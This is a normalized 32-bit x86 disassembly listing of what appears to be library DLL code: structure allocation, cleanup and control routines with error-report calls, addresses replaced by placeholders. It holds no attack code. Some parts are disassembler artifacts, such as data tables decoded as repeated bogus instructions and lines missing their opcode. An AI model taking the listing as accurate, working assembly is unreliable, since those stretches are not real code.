mov [ esi + edi * 8 + 0x28 ] eax
push r--data
push 0x3
add eax 0x10
push 0x1
push eax
call sub_1001f5f0
add esp 0x14
push 0xfb
push r--data
push 0x10
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x14 ]
test eax eax
je r-xdata
push eax
call sub_10029b30
add esp 0x4
test eax eax
jne r-xdata
push 0xdd
push 0x14
call sub_1001de60
mov eax [ esi + 0x10 ]
add esp 0x14
test eax eax
je r-xdata
inc edi
cmp edi 0x6
jl r-xdata
push 0x10f
mov [ esi + edi * 8 + 0x2c ] eax
push r--data
push 0xa
add eax 0x8
push 0x1
push eax
call sub_1001f5f0
add esp 0x14
cmp edi 0x5
ja r-xdata
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
push eax
call sub_100296b0
add esp 0x4
push eax
call sub_10029b30
add esp 0x4
test eax eax
jne r-xdata
mov edx [ esi + 0x18 ]
mov [ edx + 0x18 ] eax
push 0xe2
push r--data
push 0x3
jmp r-xdata
mov eax [ ebx + edi * 8 + 0x28 ]
test eax eax
je r-xdata
mov [ esi + 0x58 ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x12b
push r--data
push 0x112
push 0xdd
push 0x14
call sub_1001de60
add esp 0x14
jmp [ edi * 4 + jump_table_10010e58 ]
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push eax
call sub_10024660
add esp 0x4
mov ecx [ esi + 0x18 ]
mov [ ecx + 0x14 ] eax
push 0xec
push r--data
push 0x3
jmp r-xdata
add esi 0x2c
mov edi 0x6
push eax
call sub_10028ff0
add esp 0x4
mov eax [ esi ]
test eax eax
je r-xdata
push eax
call sub_10022870
add esp 0x4
add esi 0x8
dec edi
jne r-xdata
push eax
call sub_10023940
add esp 0x4
mov eax [ esi - 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
sub_10010e70
push edi
mov edi [ esp + 0x8 ]
test edi edi
je r-xdata
pop edi
retn
push 0x15a
push r--data
push 0xd
lea eax [ edi + 0x58 ]
push 0xffffffff
push eax
call sub_1001f5f0
add esp 0x14
test eax eax
jg r-xdata
mov eax [ edi + 0x10 ]
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
test eax eax
je r-xdata
push eax
call sub_100296b0
add esp 0x4
mov eax [ edi + 0x20 ]
test eax eax
je r-xdata
push eax
call sub_10024660
add esp 0x4
push ebx
push esi
lea esi [ edi + 0x2c ]
mov ebx 0x6
push eax
call sub_10028ff0
add esp 0x4
mov eax [ esi ]
test eax eax
je r-xdata
push eax
call sub_10022870
add esp 0x4
add esi 0x8
dec ebx
jne r-xdata
push eax
call sub_10023940
add esp 0x4
mov eax [ esi - 0x4 ]
test eax eax
je r-xdata
push edi
call sub_1001d740
add esp 0x4
pop esi
pop ebx
sub_10010f10
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
push 0x18d
push r--data
push 0x43
jmp r-xdata
mov eax 0x1
pop esi
retn
push 0xa7
push r--data
push 0x5c
call sub_1001d4c0
mov edx eax
add esp 0xc
test edx edx
jne r-xdata
push 0xde
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
push edi
mov ecx 0x17
xor eax eax
mov edi edx
[ edi ]
lea eax [ edx + 0x28 ]
mov [ edx + 0x58 ] 0x1
mov [ edx ] eax
pop edi
push 0xaa
push r--data
push 0x41
push 0xa2
push 0x14
call sub_1001de60
add esp 0x14
xor edx edx
jmp r-xdata
push 0x194
push r--data
push 0x41
test edx edx
mov [ esi ] edx
jne r-xdata
sub_10010fb0
push 0x1a0
push r--data
push 0x4c
call sub_1001d4c0
mov edx eax
add esp 0xc
test edx edx
jne r-xdata
push edi
mov ecx 0x13
xor eax eax
mov edi edx
[ edi ]
lea eax [ edx + 0xc ]
mov [ edx + 0x48 ] 0x1
mov [ edx + 0x8 ] eax
mov eax edx
pop edi
retn
push 0x1a3
push r--data
push 0x41
push 0xe1
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
retn
sub_10011010
push edi
mov edi [ esp + 0x8 ]
test edi edi
je r-xdata
pop edi
retn
push 0x1b5
push r--data
push 0xf
lea eax [ edi + 0x48 ]
push 0xffffffff
push eax
call sub_1001f5f0
add esp 0x14
test eax eax
jg r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
push ebx
push esi
lea esi [ edi + 0xc ]
mov ebx 0x6
push sub_10022870
push eax
call sub_1001e730
add esp 0x8
add esi 0x8
dec ebx
jne r-xdata
push eax
call sub_10022870
add esp 0x4
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ edi + 0x3c ]
pop esi
test eax eax
pop ebx
je r-xdata
mov eax [ edi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_100296b0
add esp 0x4
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_10024660
add esp 0x4
push edi
call sub_1001d740
add esp 0x4
push eax
call sub_10028ff0
add esp 0x4
sub_100110d0
mov eax 0x74
call sub_1001d0d0
push esi
push edi
mov edi [ esp + 0x84 ]
test edi edi
je r-xdata
pop edi
xor eax eax
pop esi
add esp 0x74
retn
push edi
call sub_1001e7b0
add esp 0x4
test eax eax
je r-xdata
push 0x0
push edi
call sub_1001e7c0
mov esi [ esp + 0x88 ]
push edi
push eax
lea edx [ esp + 0x18 ]
mov eax [ esi + 0xd8 ]
mov ecx [ eax + 0xc ]
push ecx
push edx
call sub_100286b0
add esp 0x18
test eax eax
jne r-xdata
mov eax [ esi + 0x70 ]
test eax eax
je r-xdata
push 0x1f4
push r--data
push 0xb
push 0xcf
push 0x14
call sub_1001de60
add esp 0x14
push 0x8c
push r--data
push 0xc
push 0x5
call sub_1001f5b0
add esp 0x10
mov eax [ rw-data ]
test eax eax
jge r-xdata
push eax
lea eax [ esp + 0xc ]
push eax
call sub_1005c960
add esp 0x4
push eax
call sub_1001f9b0
add esp 0x8
push 0x9e
push r--data
push 0xc
push 0x6
push 0x90
push r--data
push 0xc
push 0x6
call sub_1001f5b0
push 0x91
push r--data
push 0xc
push 0x9
call sub_1001f5b0
add esp 0x20
mov eax [ rw-data ]
test eax eax
jge r-xdata
push eax
lea eax [ esp + 0xc ]
push eax
call sub_10028f60
mov eax [ esi + 0xc8 ]
add esp 0x8
test eax eax
je r-xdata
mov eax r--data
push 0x9c
push r--data
push 0xc
push 0xa
jmp r-xdata
push 0x0
push 0x0
push 0x0
push r--data
push 0x0
call sub_10028660
add esp 0x14
mov [ rw-data ] eax
mov eax [ esi + 0xd8 ]
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
lea ecx [ esp + 0x8 ]
push eax
push ecx
call sub_10028f50
add esp 0x8
call sub_1001f5b0
add esp 0x10
push esi
mov ecx [ rw-data ]
lea edx [ esp + 0xc ]
push ecx
push edx
call sub_10028690
mov eax [ esi + 0x24 ]
add esp 0xc
test eax eax
mov eax r--data
jne r-xdata
lea ecx [ esp + 0x8 ]
push ecx
call sub_10027a10
add esp 0x4
mov edx [ eax + 0x68 ]
lea eax [ esp + 0x8 ]
push edx
push eax
call ecx
add esp 0x8
jmp r-xdata
mov edx [ esp + 0x64 ]
mov edi eax
lea eax [ esp + 0x8 ]
mov [ esi + 0xe0 ] edx
push eax
call sub_10028ee0
add esp 0x4
mov eax edi
pop edi
pop esi
add esp 0x74
retn
sub_10011290
mov ecx [ esp + 0x4 ]
cmp [ ecx + 0x4 ] 0x1000
jne r-xdata
mov eax [ ecx + 0xec ]
test eax eax
jne r-xdata
mov eax [ ecx ]
and al 0x0
cmp eax 0x300
jne r-xdata
retn
mov ecx [ ecx + 0xd8 ]
mov eax [ ecx + 0xa0 ]
xor eax eax
retn
mov ecx [ ecx + 0x58 ]
test ecx ecx
je r-xdata
mov eax [ ecx + 0x36c ]
retn
sub_10011330
push esi
push 0x67d
push r--data
push 0x390
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
push edi
mov ecx 0xe4
xor eax eax
mov edi esi
[ edi ]
lea eax [ esi + 0x174 ]
push eax
call sub_1002aa30
lea ecx [ esi + 0x184 ]
push ecx
call sub_1002aa30
mov eax [ esp + 0x14 ]
push eax
mov edx [ eax + 0x8 ]
mov [ eax + 0x58 ] esi
call [ edx + 0x8 ]
add esp 0xc
mov eax 0x1
pop edi
pop esi
retn
pop esi
retn
sub_10011390
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push esi
call sub_1001a420
mov eax [ esi + 0x58 ]
add esp 0x4
mov eax [ eax + 0xe0 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x58 ]
mov eax [ ecx + 0xf0 ]
test eax eax
je r-xdata
push eax
call sub_1001d740
add esp 0x4
mov edx [ esi + 0x58 ]
mov eax [ edx + 0x114 ]
test eax eax
je r-xdata
push eax
call sub_1001d740
add esp 0x4
mov eax [ esi + 0x58 ]
mov eax [ eax + 0x34c ]
test eax eax
je r-xdata
push eax
call sub_1001d740
add esp 0x4
mov ecx [ esi + 0x58 ]
mov eax [ ecx + 0x350 ]
test eax eax
je r-xdata
push eax
call sub_10024660
add esp 0x4
mov edx [ esi + 0x58 ]
mov eax [ edx + 0x36c ]
test eax eax
je r-xdata
push eax
call sub_10028ff0
add esp 0x4
mov eax [ esi + 0x58 ]
add eax 0x174
push eax
call sub_1002b000
mov ecx [ esi + 0x58 ]
add ecx 0x184
push ecx
call sub_1002b000
mov edx [ esi + 0x58 ]
push 0x390
push edx
call sub_10026870
mov eax [ esi + 0x58 ]
push eax
call sub_1001d740
add esp 0x14
mov [ esi + 0x58 ] 0x0
push sub_10020210
push eax
call sub_1001e730
add esp 0x8
sub_10011470
mov eax 0x8
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0x18 ]
push edi
push esi
call sub_1001a420
mov eax [ esi + 0x58 ]
xor ebx ebx
add esp 0x4
mov eax [ eax + 0x36c ]
cmp eax ebx
je r-xdata
mov ecx [ esi + 0x58 ]
mov eax [ ecx + 0x114 ]
cmp eax ebx
je r-xdata
push sub_10020210
push eax
call sub_1001e730
add esp 0x8
mov eax [ esi + 0x58 ]
mov eax [ eax + 0x34c ]
cmp eax ebx
je r-xdata
push eax
call sub_1001d740
mov edx [ esi + 0x58 ]
add esp 0x4
mov [ edx + 0x114 ] ebx
mov ecx [ esi + 0x58 ]
mov eax [ ecx + 0x350 ]
cmp eax ebx
je r-xdata
push eax
call sub_10024660
add esp 0x4
mov eax [ esi + 0x58 ]
mov edx [ eax + 0xf0 ]
mov ebp [ eax + 0xe0 ]
mov ecx [ eax + 0xe4 ]
mov [ esp + 0x1c ] edx
mov edx [ eax + 0xf4 ]
add eax 0x174
push eax
mov [ esp + 0x14 ] ecx
mov [ esp + 0x18 ] edx
call sub_1002b000
mov eax [ esi + 0x58 ]
add eax 0x184
push eax
call sub_1002b000
mov edi [ esi + 0x58 ]
mov ecx 0xe4
xor eax eax
push esi
[ edi ]
mov ecx [ esi + 0x58 ]
mov eax [ esp + 0x28 ]
mov [ ecx + 0xe0 ] ebp
mov edx [ esi + 0x58 ]
mov [ edx + 0xf0 ] eax
mov ecx [ esi + 0x58 ]
mov edx [ esp + 0x1c ]
mov [ ecx + 0xe4 ] edx
mov eax [ esi + 0x58 ]
mov ecx [ esp + 0x20 ]
mov [ eax + 0xf4 ] ecx
call sub_1000e790
mov edx [ esi + 0x58 ]
mov [ esi + 0x50 ] ebx
add esp 0xc
mov [ edx + 0x1a8 ] ebx
mov eax [ esi + 0x58 ]
pop edi
mov [ eax + 0x1ac ] ebx
mov ecx [ esi + 0x58 ]
mov [ ecx + 0x1b0 ] ebx
mov edx [ esi + 0x58 ]
mov [ edx + 0x1b4 ] ebx
mov [ esi ] 0x300
pop esi
pop ebp
pop ebx
add esp 0x8
retn
push eax
call sub_10028ff0
add esp 0x4
sub_100115b0
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0x14 ]
xor ebx ebx
cmp edi 0x2
je r-xdata
lea eax [ esi + 0x94 ]
push eax
call sub_10010f10
add esp 0x4
test eax eax
jne r-xdata
cmp edi 0x5
je r-xdata
lea eax [ edi - 0x1 ]
cmp eax 0x46
ja r-xdata
push 0x6ee
push r--data
push 0x41
jmp r-xdata
cmp edi 0x3
je r-xdata
pop edi
mov eax ebx
pop esi
pop ebx
retn
xor ecx ecx
mov cl [ eax + lookup_table_10011a48 ]
jmp [ ecx * 4 + jump_table_100119f0 ]
push 0xd5
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
cmp edi 0x6
jne r-xdata
mov ebx [ esi + 0x6c ]
pop edi
mov eax ebx
pop esi
pop ebx
retn
mov edx [ esi + 0x58 ]
pop edi
pop esi
mov ebx [ edx + 0x1b0 ]
mov eax ebx
pop ebx
retn
mov esi [ esi + 0x58 ]
pop edi
mov ebx [ esi + 0x1b0 ]
mov [ esi + 0x1b0 ] 0x0
mov eax ebx
pop esi
pop ebx
retn
mov eax [ esi + 0x58 ]
pop edi
pop esi
mov ebx [ eax + 0x1ac ]
mov eax ebx
pop ebx
retn
mov ecx [ esi + 0x58 ]
pop edi
pop esi
mov ebx [ ecx ]
mov eax ebx
pop ebx
retn
mov esi [ esi + 0x94 ]
test esi esi
je r-xdata
mov eax [ esp + 0x1c ]
test eax eax
jne r-xdata
push 0x724
push r--data
push 0x42
jmp r-xdata
mov eax [ esp + 0x1c ]
test eax eax
jne r-xdata
push 0x748
push r--data
push 0x42
jmp r-xdata
mov edi [ esp + 0x1c ]
test edi edi
jne r-xdata
push 0x76e
push r--data
push 0x42
jmp r-xdata
mov eax [ esp + 0x18 ]
test eax eax
jne r-xdata
mov edx [ esp + 0x1c ]
mov ebx 0x1
mov [ esi + 0x10c ] edx
pop edi
mov eax ebx
pop esi
pop ebx
retn
mov eax [ esp + 0x18 ]
mov ebx 0x1
mov [ esi + 0x118 ] eax
pop edi
mov eax ebx
pop esi
pop ebx
retn
mov edx [ esp + 0x1c ]
mov ecx [ esi + 0x124 ]
mov ebx 0x1
pop edi
mov eax ebx
pop esi
mov [ edx ] ecx
pop ebx
retn
mov eax [ esp + 0x1c ]
mov ebx 0x1
mov [ esi + 0x124 ] eax
pop edi
mov eax ebx
pop esi
pop ebx
retn
mov edx [ esp + 0x1c ]
mov ecx [ esi + 0x120 ]
mov ebx 0x1
pop edi
mov eax ebx
pop esi
mov [ edx ] ecx
pop ebx
retn
mov eax [ esp + 0x1c ]
mov ebx 0x1
mov [ esi + 0x120 ] eax
pop edi
mov eax ebx
pop esi
pop ebx
retn
mov edx [ esp + 0x1c ]
mov ecx [ esi + 0x128 ]
pop edi
mov [ edx ] ecx
mov eax [ esi + 0x12c ]
pop esi
pop ebx
retn
mov eax [ esi + 0x128 ]
test eax eax
je r-xdata
mov eax [ esi + 0x10 ]
test eax eax
jne r-xdata
push eax
call sub_1002b4e0
mov edi eax
add esp 0x4
test edi edi
jne r-xdata
push 0x714
push r--data
push 0x43
jmp r-xdata
push eax
push sub_1002a400
push sub_1002a420
call sub_1002a2b0
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
push 0x72f
push r--data
push 0x43
jmp r-xdata
push edi
call sub_100292b0
add esp 0x4
test eax eax
jne r-xdata
push 0x754
push r--data
push 0x43
jmp r-xdata
push 0x78b
push r--data
push 0xe2
mov eax [ esi + 0x110 ]
test eax eax
je r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x18 ]
mov [ esi + 0x128 ] eax
mov [ esi + 0x12c ] ecx
push eax
call sub_1001d740
add esp 0x4
mov esi [ esi + 0x2c ]
test esi esi
je r-xdata
mov edx [ esi + 0x94 ]
mov eax [ edx + 0x10 ]
test eax eax
je r-xdata
push 0x719
push r--data
push 0x4
jmp r-xdata
test [ esi + 0xf4 ] 0x100000
jne r-xdata
push 0x734
push r--data
push 0x5
jmp r-xdata
test [ esi + 0xf4 ] 0x80000
jne r-xdata
push 0x759
push r--data
push 0x2b
jmp r-xdata
mov edx [ esp + 0x1c ]
mov [ esi + 0x110 ] 0x0
test edx edx
mov ebx 0x1
je r-xdata
push eax
call sub_1001d740
add esp 0x4
mov ebx 0x1
push esi
call sub_100234b0
add esp 0x4
cmp eax 0x40
jle r-xdata
mov eax [ esi + 0x94 ]
mov ebx 0x1
mov [ eax + 0x10 ] edi
pop edi
mov eax ebx
pop esi
pop ebx
retn
push eax
call sub_100296b0
add esp 0x4
mov ecx [ esi + 0x94 ]
mov eax [ ecx + 0x18 ]
test eax eax
je r-xdata
push edi
call sub_1002b070
add esp 0x4
test eax eax
jne r-xdata
mov eax [ esi + 0x94 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
push edi
call sub_100292e0
add esp 0x4
test eax eax
jne r-xdata
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ecx 0xff
jbe r-xdata
mov ebx 0x1
pop edi
mov eax ebx
pop esi
pop ebx
retn
mov edx [ esi + 0x94 ]
mov ebx 0x1
mov eax ebx
mov [ edx + 0x18 ] edi
pop edi
pop esi
pop ebx
retn
push eax
call sub_10024660
add esp 0x4
push edi
call sub_10024660
push 0x73c
push r--data
push 0x5
push 0xd5
push 0x14
call sub_1001de60
add esp 0x18
xor eax eax
pop edi
pop esi
pop ebx
retn
mov ecx [ esi + 0x94 ]
mov ebx 0x1
mov eax ebx
mov [ ecx + 0x20 ] edi
pop edi
pop esi
pop ebx
retn
push eax
call sub_10028ff0
add esp 0x4
push edi
call sub_10028ff0
push 0x762
push r--data
push 0x2b
push 0xd5
push 0x14
call sub_1001de60
add esp 0x18
xor eax eax
pop edi
pop esi
pop ebx
retn
push edx
call sub_100266f0
add esp 0x4
mov [ esi + 0x110 ] eax
test eax eax
jne r-xdata
push 0x780
push r--data
push 0xe1
jmp r-xdata
push 0x785
push r--data
push 0x44
jmp r-xdata
sub_10011a5e
adc eax 0x15151515
adc eax 0x15151515
adc eax 0x15151515
adc eax 0x15151515
adc eax 0x15151515
adc eax 0x15151515
adc eax 0xd150c15
adc eax 0x15151515
adc eax 0x100f0e15
adc [ edx ] edx
adc edx [ eax + edx * 4 ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
cmp esi 0x5
je r-xdata
lea eax [ edi + 0x94 ]
push eax
call sub_10010f10
add esp 0x4
test eax eax
jne r-xdata
cmp esi 0x6
jne r-xdata
lea eax [ esi - 0x5 ]
cmp eax 0x33
ja r-xdata
push 0x7d0
push r--data
push 0x41
push 0xe9
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
retn
pop edi
xor eax eax
pop esi
retn
xor ecx ecx
mov cl [ eax + lookup_table_10011b48 ]
jmp [ ecx * 4 + jump_table_10011b34 ]
mov edx [ edi + 0x94 ]
mov eax [ esp + 0x14 ]
pop edi
pop esi
mov [ edx + 0x14 ] eax
xor eax eax
retn
mov ecx [ edi + 0x94 ]
mov edx [ esp + 0x14 ]
pop edi
xor eax eax
mov [ ecx + 0x1c ] edx
pop esi
retn
mov eax [ edi + 0x94 ]
mov ecx [ esp + 0x14 ]
pop edi
pop esi
mov [ eax + 0x24 ] ecx
xor eax eax
retn
mov edx [ esp + 0x14 ]
mov [ edi + 0x108 ] edx
sub_10011b4d
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add edx [ eax - 0x746f6f70 ]
dec esp
and al 0x8
push ebx
push esi
mov esi [ esp + 0xc ]
lea eax [ ecx - 0x1 ]
push edi
mov edi [ esi + 0xb0 ]
cmp eax 0x3f
ja r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
xor edx edx
mov dl [ eax + lookup_table_10011efc ]
jmp [ edx * 4 + jump_table_10011ecc ]
mov eax [ edi + 0x10 ]
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
push 0x829
push r--data
push 0x42
jmp r-xdata
mov eax [ esp + 0x1c ]
push eax
push sub_1002a400
push sub_1002a420
call sub_1002a2b0
mov ebx eax
add esp 0xc
test ebx ebx
jne r-xdata
push 0x84a
push r--data
push 0x42
jmp r-xdata
mov eax [ esp + 0x1c ]
test eax eax
jne r-xdata
push 0x873
push r--data
push 0x42
jmp r-xdata
mov ecx [ esp + 0x1c ]
pop edi
mov [ esi + 0x100 ] ecx
pop esi
mov eax 0x1
pop ebx
retn
mov eax [ esp + 0x1c ]
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
pop edi
mov [ esi + 0x13c ] eax
pop esi
mov eax 0x1
pop ebx
retn
mov eax [ esi + 0x94 ]
test eax eax
jne r-xdata
mov edi [ edi + 0x2c ]
test edi edi
je r-xdata
push 0x81b
push r--data
push 0x4
push eax
call sub_1002b4e0
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
push 0x85
push 0x14
call sub_1001de60
add esp 0x14
test [ esi + 0xa4 ] 0x100000
jne r-xdata
push 0x836
push r--data
push 0x5
jmp r-xdata
push eax
call sub_100291c0
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
push 0x856
push r--data
push 0x2b
jmp r-xdata
cmp [ esp + 0x18 ] 0x30
je r-xdata
pop edi
pop esi
mov eax 0x30
pop ebx
retn
mov ecx [ esp + 0x1c ]
mov edx [ esi + 0x94 ]
push ecx
push edx
call sub_1001e6c0
add esp 0x8
call sub_1001e3c0
test eax eax
mov [ esi + 0x94 ] eax
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
retn
push edi
call sub_100234b0
add esp 0x4
cmp eax 0x40
jle r-xdata
mov eax [ edi + 0x10 ]
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
test eax eax
je r-xdata
push ebx
call sub_1002b070
add esp 0x4
test eax eax
jne r-xdata
test [ esi + 0xa4 ] 0x80000
jne r-xdata
push 0x85c
push r--data
push 0x10
jmp r-xdata
cmp ecx 0x3b
jne r-xdata
push 0x884
push r--data
push 0x113
jmp r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
retn
mov [ edi + 0x10 ] esi
pop edi
pop esi
mov eax 0x1
pop ebx
retn
push eax
call sub_100296b0
add esp 0x4
mov [ edi + 0x18 ] ebx
pop edi
pop esi
mov eax 0x1
pop ebx
retn
push eax
call sub_10024660
add esp 0x4
push 0x83d
push r--data
push 0x5
push 0x85
push 0x14
call sub_1001de60
push ebx
call sub_10024660
add esp 0x18
xor eax eax
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x20 ]
test eax eax
je r-xdata
push ebx
call sub_100292e0
add esp 0x4
test eax eax
jne r-xdata
lea ecx [ esi + 0x104 ]
mov edx eax
mov edi [ ecx ]
mov [ edx ] edi
mov edi [ ecx + 0x4 ]
mov [ edx + 0x4 ] edi
mov edi [ ecx + 0x8 ]
mov [ edx + 0x8 ] edi
mov ecx [ ecx + 0xc ]
mov [ edx + 0xc ] ecx
lea edx [ esi + 0x114 ]
lea ecx [ eax + 0x10 ]
add esi 0x124
mov edi [ edx ]
add eax 0x20
mov [ ecx ] edi
mov edi [ edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
pop edi
mov edx [ edx + 0xc ]
mov [ ecx + 0xc ] edx
mov ecx [ esi ]
mov [ eax ] ecx
mov edx [ esi + 0x4 ]
mov [ eax + 0x4 ] edx
mov ecx [ esi + 0x8 ]
mov [ eax + 0x8 ] ecx
mov edx [ esi + 0xc ]
pop esi
mov [ eax + 0xc ] edx
mov eax 0x1
pop ebx
retn
mov ecx eax
lea edx [ esi + 0x104 ]
mov edi [ ecx ]
mov [ edx ] edi
mov edi [ ecx + 0x4 ]
mov [ edx + 0x4 ] edi
mov edi [ ecx + 0x8 ]
mov [ edx + 0x8 ] edi
mov ecx [ ecx + 0xc ]
mov [ edx + 0xc ] ecx
lea edx [ eax + 0x10 ]
lea ecx [ esi + 0x114 ]
add eax 0x20
mov edi [ edx ]
add esi 0x124
mov [ ecx ] edi
mov edi [ edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
pop edi
mov edx [ edx + 0xc ]
mov [ ecx + 0xc ] edx
mov ecx [ eax ]
mov [ esi ] ecx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
mov ecx [ eax + 0x8 ]
mov [ esi + 0x8 ] ecx
mov edx [ eax + 0xc ]
mov eax 0x1
mov [ esi + 0xc ] edx
pop esi
pop ebx
retn
mov [ edi + 0x20 ] ebx
pop edi
pop esi
mov eax 0x1
pop ebx
retn
push eax
call sub_10028ff0
add esp 0x4
push ebx
call sub_10028ff0
push 0x864
push r--data
push 0x2b
push 0x85
push 0x14
call sub_1001de60
add esp 0x18
xor eax eax
pop edi
pop esi
pop ebx
retn
sub_10011f08
or eax [ edi ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ eax ]
or ecx [ ebx ]
or ecx [ ecx ]
or [ ebx ] ecx
or ecx [ ebx ]
or ecx [ edx ]
nop
nop
nop
nop
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
add eax 0xfffffffb
push esi
mov esi [ ecx + 0xb0 ]
cmp eax 0x43
ja r-xdata
xor eax eax
pop esi
retn
xor edx edx
mov dl [ eax + lookup_table_10011fe4 ]
jmp [ edx * 4 + jump_table_10011fc8 ]
mov eax [ esp + 0x10 ]
mov [ esi + 0x14 ] eax
mov eax 0x1
pop esi
retn
mov ecx [ esp + 0x10 ]
mov eax 0x1
mov [ esi + 0x1c ] ecx
pop esi
retn
mov edx [ esp + 0x10 ]
mov eax 0x1
mov [ esi + 0x24 ] edx
pop esi
retn
mov eax [ esp + 0x10 ]
pop esi
mov [ ecx + 0xfc ] eax
mov eax 0x1
retn
mov edx [ esp + 0x10 ]
mov eax 0x1
mov [ ecx + 0x138 ] edx
pop esi
retn
mov eax [ esp + 0x10 ]
pop esi
mov [ ecx + 0x134 ] eax
mov eax 0x1
retn
sub_10011feb
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
add eax [ esi ]
push es
push es
push es
push es
push es
push es
push es
push es
add al 0x6
push es
push es
push es
push es
push es
push es
push es
add eax 0x90909090
nop
nop
nop
nop
sub_10012030
mov eax 0x28
call sub_1001d0d0
mov eax [ esp + 0x2c ]
xor ecx ecx
xor edx edx
push r-xdata
mov cl [ eax ]
mov dl [ eax + 0x1 ]
or ecx 0x30000
push 0x28
shl ecx 0x8
push 0x42
lea eax [ esp + 0xc ]
or ecx edx
push rw-data
push eax
mov [ esp + 0x1c ] ecx
call sub_10023340
add esp 0x14
test eax eax
je r-xdata
xor eax eax
cmp [ eax ] 0x0
jne r-xdata
add esp 0x28
retn
sub_10012080
mov ecx [ esp + 0x8 ]
test ecx ecx
je r-xdata
mov eax 0x2
retn
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0x3000000
je r-xdata
mov edx eax
mov [ ecx + 0x1 ] al
sar edx 0x8
mov [ ecx ] dl
xor eax eax
retn
sub_100120c0
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x2c ]
test eax eax
jne r-xdata
mov [ esi + 0x30 ] 0x3
cmp [ esi + 0x34 ] 0x4000
je r-xdata
mov eax [ esi + 0x30 ]
test al 0x1
jne r-xdata
mov ecx [ esi + 0x58 ]
mov edx [ ecx + 0x1a0 ]
test edx edx
je r-xdata
push 0x0
or al 0x1
push 0x1
push esi
mov [ esi + 0x30 ] eax
call sub_10013ab0
add esp 0xc
jmp r-xdata
test al 0x2
jne r-xdata
mov edx [ esi + 0x8 ]
push esi
call [ edx + 0x3c ]
add esp 0x4
jmp r-xdata
cmp [ esi + 0x30 ] 0x3
jne r-xdata
mov eax [ esi + 0x8 ]
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call [ eax + 0x34 ]
add esp 0x14
xor eax eax
pop esi
retn
mov ecx [ esi + 0x58 ]
mov eax [ ecx + 0x1a0 ]
test eax eax
je r-xdata
mov eax 0x1
pop esi
retn
sub_10012150
push esi
push 0x0
call [ SetLastError@IAT ]
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x58 ]
mov ecx [ eax + 0x1a8 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x58 ]
test [ eax ] 0x4
je r-xdata
mov ecx [ eax + 0xec ]
test ecx ecx
jne r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
push ecx
push edx
push 0x17
push esi
call [ eax + 0x38 ]
add esp 0x10
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x14 ]
cmp ecx edx
jne r-xdata
mov ecx [ eax + 0xfc ]
test ecx ecx
jne r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
jne r-xdata
push esi
